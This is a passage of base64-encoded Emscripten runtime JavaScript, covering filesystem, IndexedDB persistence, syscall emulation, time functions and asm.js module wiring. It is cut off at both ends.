b2x2ZShQQVRILmpvaW4yKHBhcmVudCxuYW1lKSk6cGFyZW50O3ZhciBkZXA9Z2V0VW5pcXVlUnVuRGVwZW5kZW5jeSgiY3AgIitmdWxsbmFtZSk7ZnVuY3Rpb24gcHJvY2Vzc0RhdGEoYnl0ZUFycmF5KXtmdW5jdGlvbiBmaW5pc2goYnl0ZUFycmF5KXtpZihwcmVGaW5pc2gpcHJlRmluaXNoKCk7aWYoIWRvbnRDcmVhdGVGaWxlKXtGUy5jcmVhdGVEYXRhRmlsZShwYXJlbnQsbmFtZSxieXRlQXJyYXksY2FuUmVhZCxjYW5Xcml0ZSxjYW5Pd24pfWlmKG9ubG9hZClvbmxvYWQoKTtyZW1vdmVSdW5EZXBlbmRlbmN5KGRlcCl9dmFyIGhhbmRsZWQ9ZmFsc2U7TW9kdWxlWyJwcmVsb2FkUGx1Z2lucyJdLmZvckVhY2goKGZ1bmN0aW9uKHBsdWdpbil7aWYoaGFuZGxlZClyZXR1cm47aWYocGx1Z2luWyJjYW5IYW5kbGUiXShmdWxsbmFtZSkpe3BsdWdpblsiaGFuZGxlIl0oYnl0ZUFycmF5LGZ1bGxuYW1lLGZpbmlzaCwoZnVuY3Rpb24oKXtpZihvbmVycm9yKW9uZXJyb3IoKTtyZW1vdmVSdW5EZXBlbmRlbmN5KGRlcCl9KSk7aGFuZGxlZD10cnVlfX0pKTtpZighaGFuZGxlZClmaW5pc2goYnl0ZUFycmF5KX1hZGRSdW5EZXBlbmRlbmN5KGRlcCk7aWYodHlwZW9mIHVybD09InN0cmluZyIpe0Jyb3dzZXIuYXN5bmNMb2FkKHVybCwoZnVuY3Rpb24oYnl0ZUFycmF5KXtwcm9jZXNzRGF0YShieXRlQXJyYXkpfSksb25lcnJvcil9ZWxzZXtwcm9jZXNzRGF0YSh1cmwpfX0pLGluZGV4ZWREQjooZnVuY3Rpb24oKXtyZXR1cm4gd2luZG93LmluZGV4ZWREQnx8d2luZG93Lm1vekluZGV4ZWREQnx8d2luZG93LndlYmtpdEluZGV4ZWREQnx8d2luZG93Lm1zSW5kZXhlZERCfSksREJfTkFNRTooZnVuY3Rpb24oKXtyZXR1cm4iRU1fRlNfIit3aW5kb3cubG9jYXRpb24ucGF0aG5hbWV9KSxEQl9WRVJTSU9OOjIwLERCX1NUT1JFX05BTUU6IkZJTEVfREFUQSIsc2F2ZUZpbGVzVG9EQjooZnVuY3Rpb24ocGF0aHMsb25sb2FkLG9uZXJyb3Ipe29ubG9hZD1vbmxvYWR8fChmdW5jdGlvbigpe30pO29uZXJyb3I9b25lcnJvcnx8KGZ1bmN0aW9uKCl7fSk7dmFyIGluZGV4ZWREQj1GUy5pbmRleGVkREIoKTt0cnl7dmFyIG9wZW5SZXF1ZXN0PWluZGV4ZWREQi5vcGVuKEZTLkRCX05BTUUoKSxGUy5EQl9WRVJTSU9OKX1jYXRjaChlKXtyZXR1cm4gb25lcnJvcihlKX1vcGVuUmVxdWVzdC5vbnVwZ3JhZGVuZWVkZWQ9ZnVuY3Rpb24gb3BlblJlcXVlc3Rfb251cGdyYWRlbmVlZGVkKCl7Y29uc29sZS5sb2coImNyZWF0aW5nIGRiIik7dmFyIGRiPW9wZW5SZXF1ZXN0LnJlc3VsdDtkYi5jcmVhdGVPYmplY3RTdG9yZShGUy5EQl9TVE9SRV9OQU1FKX07b3BlblJlcXVlc3Qub25zdWNjZXNzPWZ1bmN0aW9uIG9wZW5SZXF1ZXN0X29uc3VjY2Vzcygpe3ZhciBkYj1vcGVuUmVxdWVzdC5yZXN1bHQ7dmFyIHRyYW5zYWN0aW9uPWRiLnRyYW5zYWN0aW9uKFtGUy5EQl9TVE9SRV9OQU1FXSwicmVhZHdyaXRlIik7dmFyIGZpbGVzPXRyYW5zYWN0aW9uLm9iamVjdFN0b3JlKEZTLkRCX1NUT1JFX05BTUUpO3ZhciBvaz0wLGZhaWw9MCx0b3RhbD1wYXRocy5sZW5ndGg7ZnVuY3Rpb24gZmluaXNoKCl7aWYoZmFpbD09MClvbmxvYWQoKTtlbHNlIG9uZXJyb3IoKX1wYXRocy5mb3JFYWNoKChmdW5jdGlvbihwYXRoKXt2YXIgcHV0UmVxdWVzdD1maWxlcy5wdXQoRlMuYW5hbHl6ZVBhdGgocGF0aCkub2JqZWN0LmNvbnRlbnRzLHBhdGgpO3B1dFJlcXVlc3Qub25zdWNjZXNzPWZ1bmN0aW9uIHB1dFJlcXVlc3Rfb25zdWNjZXNzKCl7b2srKztpZihvaytmYWlsPT10b3RhbClmaW5pc2goKX07cHV0UmVxdWVzdC5vbmVycm9yPWZ1bmN0aW9uIHB1dFJlcXVlc3Rfb25lcnJvcigpe2ZhaWwrKztpZihvaytmYWlsPT10b3RhbClmaW5pc2goKX19KSk7dHJhbnNhY3Rpb24ub25lcnJvcj1vbmVycm9yfTtvcGVuUmVxdWVzdC5vbmVycm9yPW9uZXJyb3J9KSxsb2FkRmlsZXNGcm9tREI6KGZ1bmN0aW9uKHBhdGhzLG9ubG9hZCxvbmVycm9yKXtvbmxvYWQ9b25sb2FkfHwoZnVuY3Rpb24oKXt9KTtvbmVycm9yPW9uZXJyb3J8fChmdW5jdGlvbigpe30pO3ZhciBpbmRleGVkREI9RlMuaW5kZXhlZERCKCk7dHJ5e3ZhciBvcGVuUmVxdWVzdD1pbmRleGVkREIub3BlbihGUy5EQl9OQU1FKCksRlMuREJfVkVSU0lPTil9Y2F0Y2goZSl7cmV0dXJuIG9uZXJyb3IoZSl9b3BlblJlcXVlc3Qub251cGdyYWRlbmVlZGVkPW9uZXJyb3I7b3BlblJlcXVlc3Qub25zdWNjZXNzPWZ1bmN0aW9uIG9wZW5SZXF1ZXN0X29uc3VjY2Vzcygpe3ZhciBkYj1vcGVuUmVxdWVzdC5yZXN1bHQ7dHJ5e3ZhciB0cmFuc2FjdGlvbj1kYi50cmFuc2FjdGlvbihbRlMuREJfU1RPUkVfTkFNRV0sInJlYWRvbmx5Iil9Y2F0Y2goZSl7b25lcnJvcihlKTtyZXR1cm59dmFyIGZpbGVzPXRyYW5zYWN0aW9uLm9iamVjdFN0b3JlKEZTLkRCX1NUT1JFX05BTUUpO3ZhciBvaz0wLGZhaWw9MCx0b3RhbD1wYXRocy5sZW5ndGg7ZnVuY3Rpb24gZmluaXNoKCl7aWYoZmFpbD09MClvbmxvYWQoKTtlbHNlIG9uZXJyb3IoKX1wYXRocy5mb3JFYWNoKChmdW5jdGlvbihwYXRoKXt2YXIgZ2V0UmVxdWVzdD1maWxlcy5nZXQocGF0aCk7Z2V0UmVxdWVzdC5vbnN1Y2Nlc3M9ZnVuY3Rpb24gZ2V0UmVxdWVzdF9vbnN1Y2Nlc3MoKXtpZihGUy5hbmFseXplUGF0aChwYXRoKS5leGlzdHMpe0ZTLnVubGluayhwYXRoKX1GUy5jcmVhdGVEYXRhRmlsZShQQVRILmRpcm5hbWUocGF0aCksUEFUSC5iYXNlbmFtZShwYXRoKSxnZXRSZXF1ZXN0LnJlc3VsdCx0cnVlLHRydWUsdHJ1ZSk7b2srKztpZihvaytmYWlsPT10b3RhbClmaW5pc2goKX07Z2V0UmVxdWVzdC5vbmVycm9yPWZ1bmN0aW9uIGdldFJlcXVlc3Rfb25lcnJvcigpe2ZhaWwrKztpZihvaytmYWlsPT10b3RhbClmaW5pc2goKX19KSk7dHJhbnNhY3Rpb24ub25lcnJvcj1vbmVycm9yfTtvcGVuUmVxdWVzdC5vbmVycm9yPW9uZXJyb3J9KX07dmFyIFNZU0NBTExTPXtERUZBVUxUX1BPTExNQVNLOjUsbWFwcGluZ3M6e30sdW1hc2s6NTExLGNhbGN1bGF0ZUF0OihmdW5jdGlvbihkaXJmZCxwYXRoKXtpZihwYXRoWzBdIT09Ii8iKXt2YXIgZGlyO2lmKGRpcmZkPT09LTEwMCl7ZGlyPUZTLmN3ZCgpfWVsc2V7dmFyIGRpcnN0cmVhbT1GUy5nZXRTdHJlYW0oZGlyZmQpO2lmKCFkaXJzdHJlYW0pdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUJBREYpO2Rpcj1kaXJzdHJlYW0ucGF0aH1wYXRoPVBBVEguam9pbjIoZGlyLHBhdGgpfXJldHVybiBwYXRofSksZG9TdGF0OihmdW5jdGlvbihmdW5jLHBhdGgsYnVmKXt0cnl7dmFyIHN0YXQ9ZnVuYyhwYXRoKX1jYXRjaChlKXtpZihlJiZlLm5vZGUmJlBBVEgubm9ybWFsaXplKHBhdGgpIT09UEFUSC5ub3JtYWxpemUoRlMuZ2V0UGF0aChlLm5vZGUpKSl7cmV0dXJuLUVSUk5PX0NPREVTLkVOT1RESVJ9dGhyb3cgZX1IRUFQMzJbYnVmPj4yXT1zdGF0LmRldjtIRUFQMzJbYnVmKzQ+PjJdPTA7SEVBUDMyW2J1Zis4Pj4yXT1zdGF0LmlubztIRUFQMzJbYnVmKzEyPj4yXT1zdGF0Lm1vZGU7SEVBUDMyW2J1ZisxNj4+Ml09c3RhdC5ubGluaztIRUFQMzJbYnVmKzIwPj4yXT1zdGF0LnVpZDtIRUFQMzJbYnVmKzI0Pj4yXT1zdGF0LmdpZDtIRUFQMzJbYnVmKzI4Pj4yXT1zdGF0LnJkZXY7SEVBUDMyW2J1ZiszMj4+Ml09MDtIRUFQMzJbYnVmKzM2Pj4yXT1zdGF0LnNpemU7SEVBUDMyW2J1Zis0MD4+Ml09NDA5NjtIRUFQMzJbYnVmKzQ0Pj4yXT1zdGF0LmJsb2NrcztIRUFQMzJbYnVmKzQ4Pj4yXT1zdGF0LmF0aW1lLmdldFRpbWUoKS8xZTN8MDtIRUFQMzJbYnVmKzUyPj4yXT0wO0hFQVAzMltidWYrNTY+PjJdPXN0YXQubXRpbWUuZ2V0VGltZSgpLzFlM3wwO0hFQVAzMltidWYrNjA+PjJdPTA7SEVBUDMyW2J1Zis2ND4+Ml09c3RhdC5jdGltZS5nZXRUaW1lKCkvMWUzfDA7SEVBUDMyW2J1Zis2OD4+Ml09MDtIRUFQMzJbYnVmKzcyPj4yXT1zdGF0LmlubztyZXR1cm4gMH0pLGRvTXN5bmM6KGZ1bmN0aW9uKGFkZHIsc3RyZWFtLGxlbixmbGFncyl7dmFyIGJ1ZmZlcj1uZXcgVWludDhBcnJheShIRUFQVTguc3ViYXJyYXkoYWRkcixhZGRyK2xlbikpO0ZTLm1zeW5jKHN0cmVhbSxidWZmZXIsMCxsZW4sZmxhZ3MpfSksZG9Na2RpcjooZnVuY3Rpb24ocGF0aCxtb2RlKXtwYXRoPVBBVEgubm9ybWFsaXplKHBhdGgpO2lmKHBhdGhbcGF0aC5sZW5ndGgtMV09PT0iLyIpcGF0aD1wYXRoLnN1YnN0cigwLHBhdGgubGVuZ3RoLTEpO0ZTLm1rZGlyKHBhdGgsbW9kZSwwKTtyZXR1cm4gMH0pLGRvTWtub2Q6KGZ1bmN0aW9uKHBhdGgsbW9kZSxkZXYpe3N3aXRjaChtb2RlJjYxNDQwKXtjYXNlIDMyNzY4OmNhc2UgODE5MjpjYXNlIDI0NTc2OmNhc2UgNDA5NjpjYXNlIDQ5MTUyOmJyZWFrO2RlZmF1bHQ6cmV0dXJuLUVSUk5PX0NPREVTLkVJTlZBTH1GUy5ta25vZChwYXRoLG1vZGUsZGV2KTtyZXR1cm4gMH0pLGRvUmVhZGxpbms6KGZ1bmN0aW9uKHBhdGgsYnVmLGJ1ZnNpemUpe2lmKGJ1ZnNpemU8PTApcmV0dXJuLUVSUk5PX0NPREVTLkVJTlZBTDt2YXIgcmV0PUZTLnJlYWRsaW5rKHBhdGgpO3ZhciBsZW49TWF0aC5taW4oYnVmc2l6ZSxsZW5ndGhCeXRlc1VURjgocmV0KSk7dmFyIGVuZENoYXI9SEVBUDhbYnVmK2xlbl07c3RyaW5nVG9VVEY4KHJldCxidWYsYnVmc2l6ZSsxKTtIRUFQOFtidWYrbGVuXT1lbmRDaGFyO3JldHVybiBsZW59KSxkb0FjY2VzczooZnVuY3Rpb24ocGF0aCxhbW9kZSl7aWYoYW1vZGUmfjcpe3JldHVybi1FUlJOT19DT0RFUy5FSU5WQUx9dmFyIG5vZGU7dmFyIGxvb2t1cD1GUy5sb29rdXBQYXRoKHBhdGgse2ZvbGxvdzp0cnVlfSk7bm9kZT1sb29rdXAubm9kZTt2YXIgcGVybXM9IiI7aWYoYW1vZGUmNClwZXJtcys9InIiO2lmKGFtb2RlJjIpcGVybXMrPSJ3IjtpZihhbW9kZSYxKXBlcm1zKz0ieCI7aWYocGVybXMmJkZTLm5vZGVQZXJtaXNzaW9ucyhub2RlLHBlcm1zKSl7cmV0dXJuLUVSUk5PX0NPREVTLkVBQ0NFU31yZXR1cm4gMH0pLGRvRHVwOihmdW5jdGlvbihwYXRoLGZsYWdzLHN1Z2dlc3RGRCl7dmFyIHN1Z2dlc3Q9RlMuZ2V0U3RyZWFtKHN1Z2dlc3RGRCk7aWYoc3VnZ2VzdClGUy5jbG9zZShzdWdnZXN0KTtyZXR1cm4gRlMub3BlbihwYXRoLGZsYWdzLDAsc3VnZ2VzdEZELHN1Z2dlc3RGRCkuZmR9KSxkb1JlYWR2OihmdW5jdGlvbihzdHJlYW0saW92LGlvdmNudCxvZmZzZXQpe3ZhciByZXQ9MDtmb3IodmFyIGk9MDtpPGlvdmNudDtpKyspe3ZhciBwdHI9SEVBUDMyW2lvditpKjg+PjJdO3ZhciBsZW49SEVBUDMyW2lvdisoaSo4KzQpPj4yXTt2YXIgY3Vycj1GUy5yZWFkKHN0cmVhbSxIRUFQOCxwdHIsbGVuLG9mZnNldCk7aWYoY3VycjwwKXJldHVybi0xO3JldCs9Y3VycjtpZihjdXJyPGxlbilicmVha31yZXR1cm4gcmV0fSksZG9Xcml0ZXY6KGZ1bmN0aW9uKHN0cmVhbSxpb3YsaW92Y250LG9mZnNldCl7dmFyIHJldD0wO2Zvcih2YXIgaT0wO2k8aW92Y250O2krKyl7dmFyIHB0cj1IRUFQMzJbaW92K2kqOD4+Ml07dmFyIGxlbj1IRUFQMzJbaW92KyhpKjgrNCk+PjJdO3ZhciBjdXJyPUZTLndyaXRlKHN0cmVhbSxIRUFQOCxwdHIsbGVuLG9mZnNldCk7aWYoY3VycjwwKXJldHVybi0xO3JldCs9Y3Vycn1yZXR1cm4gcmV0fSksdmFyYXJnczowLGdldDooZnVuY3Rpb24odmFyYXJncyl7U1lTQ0FMTFMudmFyYXJncys9NDt2YXIgcmV0PUhFQVAzMltTWVNDQUxMUy52YXJhcmdzLTQ+PjJdO3JldHVybiByZXR9KSxnZXRTdHI6KGZ1bmN0aW9uKCl7dmFyIHJldD1Qb2ludGVyX3N0cmluZ2lmeShTWVNDQUxMUy5nZXQoKSk7cmV0dXJuIHJldH0pLGdldFN0cmVhbUZyb21GRDooZnVuY3Rpb24oKXt2YXIgc3RyZWFtPUZTLmdldFN0cmVhbShTWVNDQUxMUy5nZXQoKSk7aWYoIXN0cmVhbSl0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FQkFERik7cmV0dXJuIHN0cmVhbX0pLGdldFNvY2tldEZyb21GRDooZnVuY3Rpb24oKXt2YXIgc29ja2V0PVNPQ0tGUy5nZXRTb2NrZXQoU1lTQ0FMTFMuZ2V0KCkpO2lmKCFzb2NrZXQpdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUJBREYpO3JldHVybiBzb2NrZXR9KSxnZXRTb2NrZXRBZGRyZXNzOihmdW5jdGlvbihhbGxvd051bGwpe3ZhciBhZGRycD1TWVNDQUxMUy5nZXQoKSxhZGRybGVuPVNZU0NBTExTLmdldCgpO2lmKGFsbG93TnVsbCYmYWRkcnA9PT0wKXJldHVybiBudWxsO3ZhciBpbmZvPV9fcmVhZF9zb2NrYWRkcihhZGRycCxhZGRybGVuKTtpZihpbmZvLmVycm5vKXRocm93IG5ldyBGUy5FcnJub0Vycm9yKGluZm8uZXJybm8pO2luZm8uYWRkcj1ETlMubG9va3VwX2FkZHIoaW5mby5hZGRyKXx8aW5mby5hZGRyO3JldHVybiBpbmZvfSksZ2V0NjQ6KGZ1bmN0aW9uKCl7dmFyIGxvdz1TWVNDQUxMUy5nZXQoKSxoaWdoPVNZU0NBTExTLmdldCgpO2lmKGxvdz49MClhc3NlcnQoaGlnaD09PTApO2Vsc2UgYXNzZXJ0KGhpZ2g9PT0tMSk7cmV0dXJuIGxvd30pLGdldFplcm86KGZ1bmN0aW9uKCl7YXNzZXJ0KFNZU0NBTExTLmdldCgpPT09MCl9KX07ZnVuY3Rpb24gX19fc3lzY2FsbDIwKHdoaWNoLHZhcmFyZ3Mpe1NZU0NBTExTLnZhcmFyZ3M9dmFyYXJnczt0cnl7cmV0dXJuIFBST0NJTkZPLnBpZH1jYXRjaChlKXtpZih0eXBlb2YgRlM9PT0idW5kZWZpbmVkInx8IShlIGluc3RhbmNlb2YgRlMuRXJybm9FcnJvcikpYWJvcnQoZSk7cmV0dXJuLWUuZXJybm99fXZhciBfX190bV9jdXJyZW50PVNUQVRJQ1RPUDtTVEFUSUNUT1ArPTQ4O3ZhciBfX190bV90aW1lem9uZT1hbGxvY2F0ZShpbnRBcnJheUZyb21TdHJpbmcoIkdNVCIpLCJpOCIsQUxMT0NfU1RBVElDKTtmdW5jdGlvbiBfZ210aW1lX3IodGltZSx0bVB0cil7dmFyIGRhdGU9bmV3IERhdGUoSEVBUDMyW3RpbWU+PjJdKjFlMyk7SEVBUDMyW3RtUHRyPj4yXT1kYXRlLmdldFVUQ1NlY29uZHMoKTtIRUFQMzJbdG1QdHIrND4+Ml09ZGF0ZS5nZXRVVENNaW51dGVzKCk7SEVBUDMyW3RtUHRyKzg+PjJdPWRhdGUuZ2V0VVRDSG91cnMoKTtIRUFQMzJbdG1QdHIrMTI+PjJdPWRhdGUuZ2V0VVRDRGF0ZSgpO0hFQVAzMlt0bVB0cisxNj4+Ml09ZGF0ZS5nZXRVVENNb250aCgpO0hFQVAzMlt0bVB0cisyMD4+Ml09ZGF0ZS5nZXRVVENGdWxsWWVhcigpLTE5MDA7SEVBUDMyW3RtUHRyKzI0Pj4yXT1kYXRlLmdldFVUQ0RheSgpO0hFQVAzMlt0bVB0ciszNj4+Ml09MDtIRUFQMzJbdG1QdHIrMzI+PjJdPTA7dmFyIHN0YXJ0PURhdGUuVVRDKGRhdGUuZ2V0VVRDRnVsbFllYXIoKSwwLDEsMCwwLDAsMCk7dmFyIHlkYXk9KGRhdGUuZ2V0VGltZSgpLXN0YXJ0KS8oMWUzKjYwKjYwKjI0KXwwO0hFQVAzMlt0bVB0cisyOD4+Ml09eWRheTtIRUFQMzJbdG1QdHIrNDA+PjJdPV9fX3RtX3RpbWV6b25lO3JldHVybiB0bVB0cn1mdW5jdGlvbiBfZ210aW1lKHRpbWUpe3JldHVybiBfZ210aW1lX3IodGltZSxfX190bV9jdXJyZW50KX1mdW5jdGlvbiBfX19sb2NrKCl7fWZ1bmN0aW9uIF9fX3VubG9jaygpe31mdW5jdGlvbiBfX19zeXNjYWxsNih3aGljaCx2YXJhcmdzKXtTWVNDQUxMUy52YXJhcmdzPXZhcmFyZ3M7dHJ5e3ZhciBzdHJlYW09U1lTQ0FMTFMuZ2V0U3RyZWFtRnJvbUZEKCk7RlMuY2xvc2Uoc3RyZWFtKTtyZXR1cm4gMH1jYXRjaChlKXtpZih0eXBlb2YgRlM9PT0idW5kZWZpbmVkInx8IShlIGluc3RhbmNlb2YgRlMuRXJybm9FcnJvcikpYWJvcnQoZSk7cmV0dXJuLWUuZXJybm99fWZ1bmN0aW9uIF9lbXNjcmlwdGVuX21lbWNweV9iaWcoZGVzdCxzcmMsbnVtKXtIRUFQVTguc2V0KEhFQVBVOC5zdWJhcnJheShzcmMsc3JjK251bSksZGVzdCk7cmV0dXJuIGRlc3R9ZnVuY3Rpb24gX2Z0aW1lKHApe3ZhciBtaWxsaXM9RGF0ZS5ub3coKTtIRUFQMzJbcD4+Ml09bWlsbGlzLzFlM3wwO0hFQVAxNltwKzQ+PjFdPW1pbGxpcyUxZTM7SEVBUDE2W3ArNj4+MV09MDtIRUFQMTZbcCs4Pj4xXT0wO3JldHVybiAwfWZ1bmN0aW9uIF9fX3N5c2NhbGwxNDAod2hpY2gsdmFyYXJncyl7U1lTQ0FMTFMudmFyYXJncz12YXJhcmdzO3RyeXt2YXIgc3RyZWFtPVNZU0NBTExTLmdldFN0cmVhbUZyb21GRCgpLG9mZnNldF9oaWdoPVNZU0NBTExTLmdldCgpLG9mZnNldF9sb3c9U1lTQ0FMTFMuZ2V0KCkscmVzdWx0PVNZU0NBTExTLmdldCgpLHdoZW5jZT1TWVNDQUxMUy5nZXQoKTt2YXIgb2Zmc2V0PW9mZnNldF9sb3c7RlMubGxzZWVrKHN0cmVhbSxvZmZzZXQsd2hlbmNlKTtIRUFQMzJbcmVzdWx0Pj4yXT1zdHJlYW0ucG9zaXRpb247aWYoc3RyZWFtLmdldGRlbnRzJiZvZmZzZXQ9PT0wJiZ3aGVuY2U9PT0wKXN0cmVhbS5nZXRkZW50cz1udWxsO3JldHVybiAwfWNhdGNoKGUpe2lmKHR5cGVvZiBGUz09PSJ1bmRlZmluZWQifHwhKGUgaW5zdGFuY2VvZiBGUy5FcnJub0Vycm9yKSlhYm9ydChlKTtyZXR1cm4tZS5lcnJub319ZnVuY3Rpb24gX19fc3lzY2FsbDE0Nih3aGljaCx2YXJhcmdzKXtTWVNDQUxMUy52YXJhcmdzPXZhcmFyZ3M7dHJ5e3ZhciBzdHJlYW09U1lTQ0FMTFMuZ2V0U3RyZWFtRnJvbUZEKCksaW92PVNZU0NBTExTLmdldCgpLGlvdmNudD1TWVNDQUxMUy5nZXQoKTtyZXR1cm4gU1lTQ0FMTFMuZG9Xcml0ZXYoc3RyZWFtLGlvdixpb3ZjbnQpfWNhdGNoKGUpe2lmKHR5cGVvZiBGUz09PSJ1bmRlZmluZWQifHwhKGUgaW5zdGFuY2VvZiBGUy5FcnJub0Vycm9yKSlhYm9ydChlKTtyZXR1cm4tZS5lcnJub319ZnVuY3Rpb24gX19fc3lzY2FsbDU0KHdoaWNoLHZhcmFyZ3Mpe1NZU0NBTExTLnZhcmFyZ3M9dmFyYXJnczt0cnl7dmFyIHN0cmVhbT1TWVNDQUxMUy5nZXRTdHJlYW1Gcm9tRkQoKSxvcD1TWVNDQUxMUy5nZXQoKTtzd2l0Y2gob3Ape2Nhc2UgMjE1MDU6e2lmKCFzdHJlYW0udHR5KXJldHVybi1FUlJOT19DT0RFUy5FTk9UVFk7cmV0dXJuIDB9O2Nhc2UgMjE1MDY6e2lmKCFzdHJlYW0udHR5KXJldHVybi1FUlJOT19DT0RFUy5FTk9UVFk7cmV0dXJuIDB9O2Nhc2UgMjE1MTk6e2lmKCFzdHJlYW0udHR5KXJldHVybi1FUlJOT19DT0RFUy5FTk9UVFk7dmFyIGFyZ3A9U1lTQ0FMTFMuZ2V0KCk7SEVBUDMyW2FyZ3A+PjJdPTA7cmV0dXJuIDB9O2Nhc2UgMjE1MjA6e2lmKCFzdHJlYW0udHR5KXJldHVybi1FUlJOT19DT0RFUy5FTk9UVFk7cmV0dXJuLUVSUk5PX0NPREVTLkVJTlZBTH07Y2FzZSAyMTUzMTp7dmFyIGFyZ3A9U1lTQ0FMTFMuZ2V0KCk7cmV0dXJuIEZTLmlvY3RsKHN0cmVhbSxvcCxhcmdwKX07Y2FzZSAyMTUyMzp7aWYoIXN0cmVhbS50dHkpcmV0dXJuLUVSUk5PX0NPREVTLkVOT1RUWTtyZXR1cm4gMH07ZGVmYXVsdDphYm9ydCgiYmFkIGlvY3RsIHN5c2NhbGwgIitvcCl9fWNhdGNoKGUpe2lmKHR5cGVvZiBGUz09PSJ1bmRlZmluZWQifHwhKGUgaW5zdGFuY2VvZiBGUy5FcnJub0Vycm9yKSlhYm9ydChlKTtyZXR1cm4tZS5lcnJub319RlMuc3RhdGljSW5pdCgpO19fQVRJTklUX18udW5zaGlmdCgoZnVuY3Rpb24oKXtpZighTW9kdWxlWyJub0ZTSW5pdCJdJiYhRlMuaW5pdC5pbml0aWFsaXplZClGUy5pbml0KCl9KSk7X19BVE1BSU5fXy5wdXNoKChmdW5jdGlvbigpe0ZTLmlnbm9yZVBlcm1pc3Npb25zPWZhbHNlfSkpO19fQVRFWElUX18ucHVzaCgoZnVuY3Rpb24oKXtGUy5xdWl0KCl9KSk7TW9kdWxlWyJGU19jcmVhdGVGb2xkZXIiXT1GUy5jcmVhdGVGb2xkZXI7TW9kdWxlWyJGU19jcmVhdGVQYXRoIl09RlMuY3JlYXRlUGF0aDtNb2R1bGVbIkZTX2NyZWF0ZURhdGFGaWxlIl09RlMuY3JlYXRlRGF0YUZpbGU7TW9kdWxlWyJGU19jcmVhdGVQcmVsb2FkZWRGaWxlIl09RlMuY3JlYXRlUHJlbG9hZGVkRmlsZTtNb2R1bGVbIkZTX2NyZWF0ZUxhenlGaWxlIl09RlMuY3JlYXRlTGF6eUZpbGU7TW9kdWxlWyJGU19jcmVhdGVMaW5rIl09RlMuY3JlYXRlTGluaztNb2R1bGVbIkZTX2NyZWF0ZURldmljZSJdPUZTLmNyZWF0ZURldmljZTtNb2R1bGVbIkZTX3VubGluayJdPUZTLnVubGluaztfX0FUSU5JVF9fLnVuc2hpZnQoKGZ1bmN0aW9uKCl7VFRZLmluaXQoKX0pKTtfX0FURVhJVF9fLnB1c2goKGZ1bmN0aW9uKCl7VFRZLnNodXRkb3duKCl9KSk7aWYoRU5WSVJPTk1FTlRfSVNfTk9ERSl7dmFyIGZzPXJlcXVpcmUoImZzIik7dmFyIE5PREVKU19QQVRIPXJlcXVpcmUoInBhdGgiKTtOT0RFRlMuc3RhdGljSW5pdCgpfURZTkFNSUNUT1BfUFRSPWFsbG9jYXRlKDEsImkzMiIsQUxMT0NfU1RBVElDKTtTVEFDS19CQVNFPVNUQUNLVE9QPVJ1bnRpbWUuYWxpZ25NZW1vcnkoU1RBVElDVE9QKTtTVEFDS19NQVg9U1RBQ0tfQkFTRStUT1RBTF9TVEFDSztEWU5BTUlDX0JBU0U9UnVudGltZS5hbGlnbk1lbW9yeShTVEFDS19NQVgpO0hFQVAzMltEWU5BTUlDVE9QX1BUUj4+Ml09RFlOQU1JQ19CQVNFO3N0YXRpY1NlYWxlZD10cnVlO01vZHVsZVsid2FzbVRhYmxlU2l6ZSJdPTE0O01vZHVsZVsid2FzbU1heFRhYmxlU2l6ZSJdPTE0O2Z1bmN0aW9uIGludm9rZV9paShpbmRleCxhMSl7dHJ5e3JldHVybiBNb2R1bGVbImR5bkNhbGxfaWkiXShpbmRleCxhMSl9Y2F0Y2goZSl7aWYodHlwZW9mIGUhPT0ibnVtYmVyIiYmZSE9PSJsb25nam1wIil0aHJvdyBlO01vZHVsZVsic2V0VGhyZXciXSgxLDApfX1mdW5jdGlvbiBpbnZva2VfaWlpaShpbmRleCxhMSxhMixhMyl7dHJ5e3JldHVybiBNb2R1bGVbImR5bkNhbGxfaWlpaSJdKGluZGV4LGExLGEyLGEzKX1jYXRjaChlKXtpZih0eXBlb2YgZSE9PSJudW1iZXIiJiZlIT09ImxvbmdqbXAiKXRocm93IGU7TW9kdWxlWyJzZXRUaHJldyJdKDEsMCl9fWZ1bmN0aW9uIGludm9rZV92aWlpKGluZGV4LGExLGEyLGEzKXt0cnl7TW9kdWxlWyJkeW5DYWxsX3ZpaWkiXShpbmRleCxhMSxhMixhMyl9Y2F0Y2goZSl7aWYodHlwZW9mIGUhPT0ibnVtYmVyIiYmZSE9PSJsb25nam1wIil0aHJvdyBlO01vZHVsZVsic2V0VGhyZXciXSgxLDApfX1Nb2R1bGUuYXNtR2xvYmFsQXJnPXsiTWF0aCI6TWF0aCwiSW50OEFycmF5IjpJbnQ4QXJyYXksIkludDE2QXJyYXkiOkludDE2QXJyYXksIkludDMyQXJyYXkiOkludDMyQXJyYXksIlVpbnQ4QXJyYXkiOlVpbnQ4QXJyYXksIlVpbnQxNkFycmF5IjpVaW50MTZBcnJheSwiVWludDMyQXJyYXkiOlVpbnQzMkFycmF5LCJGbG9hdDMyQXJyYXkiOkZsb2F0MzJBcnJheSwiRmxvYXQ2NEFycmF5IjpGbG9hdDY0QXJyYXksIk5hTiI6TmFOLCJJbmZpbml0eSI6SW5maW5pdHl9O01vZHVsZS5hc21MaWJyYXJ5QXJnPXsiYWJvcnQiOmFib3J0LCJhc3NlcnQiOmFzc2VydCwiZW5sYXJnZU1lbW9yeSI6ZW5sYXJnZU1lbW9yeSwiZ2V0VG90YWxNZW1vcnkiOmdldFRvdGFsTWVtb3J5LCJhYm9ydE9uQ2Fubm90R3Jvd01lbW9yeSI6YWJvcnRPbkNhbm5vdEdyb3dNZW1vcnksImludm9rZV9paSI6aW52b2tlX2lpLCJpbnZva2VfaWlpaSI6aW52b2tlX2lpaWksImludm9rZV92aWlpIjppbnZva2VfdmlpaSwiX2dtdGltZV9yIjpfZ210aW1lX3IsIl9nbXRpbWUiOl9nbXRpbWUsIl9fX2xvY2siOl9fX2xvY2ssIl9fX3N5c2NhbGw2IjpfX19zeXNjYWxsNiwiX19fc2V0RXJyTm8iOl9fX3NldEVyck5vLCJfX191bmxvY2siOl9fX3VubG9jaywiX2Z0aW1lIjpfZnRpbWUsIl9lbXNjcmlwdGVuX21lbWNweV9iaWciOl9lbXNjcmlwdGVuX21lbWNweV9iaWcsIl9fX3N5c2NhbGw1NCI6X19fc3lzY2FsbDU0LCJfX19zeXNjYWxsMTQwIjpfX19zeXNjYWxsMTQwLCJfX19zeXNjYWxsMjAiOl9fX3N5c2NhbGwyMCwiX19fYXNzZXJ0X2ZhaWwiOl9fX2Fzc2VydF9mYW